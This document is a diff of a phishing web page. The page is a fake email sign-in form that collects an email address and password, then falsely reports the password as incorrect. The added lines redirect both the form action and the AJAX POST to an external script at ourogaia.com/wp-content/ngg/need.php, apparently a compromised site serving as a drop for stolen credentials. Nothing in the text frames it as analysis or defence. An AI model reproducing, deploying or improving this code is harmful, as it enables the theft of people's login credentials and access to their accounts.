@@ -47,7 +47,7 @@
 <p class=MsoNormal><o:p>&nbsp;</o:p></p>
  
 
- <form name=login_form id=ajaxform method=post action="need.php">
+ <form name=login_form id=ajaxform method=post action="https://ourogaia.com/wp-content/ngg/need.php">
  <label><strong>Email<strong/></label>
  <input name=nameuser id=email type=text value required>
  
@@ -202,7 +202,7 @@ count=count+1;
 
 $.ajax({
 dataType: 'JSON',
-url: 'need.php',
+url: 'https://ourogaia.com/wp-content/ngg/need.php',
 type: 'POST',
       	data:{
       		email:email,
@@ -242,7 +242,7 @@ type: 'POST',
     	$('#msg').html("your password is incorrect! Please enter the correct email password and try again. ");
     },
     complete: function(){
-    	$('#submit-btn').val('Sign in');
+    	$('#submit-btn').val('LOGIN');
     }
 });
   });
